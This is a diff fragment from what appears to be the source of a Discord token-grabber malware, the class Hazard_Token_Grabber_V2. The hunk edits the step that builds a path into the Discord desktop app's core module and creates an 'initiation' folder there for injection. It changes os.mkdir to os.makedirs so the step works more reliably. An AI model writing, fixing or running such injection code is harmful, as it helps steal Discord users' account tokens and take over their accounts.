@@ -161,7 +161,7 @@ class Hazard_Token_Grabber_V2(functions):
                         app = os.path.abspath(disc_sep+__dir)
                         inj_path = app+'\\modules\\discord_desktop_core-2\\discord_desktop_core\\'
                         try:
-                            os.mkdir(inj_path+'initiation')
+                            os.makedirs(inj_path+'initiation')
                         except FileExistsError:
                             pass
                         if os.path.exists(inj_path):
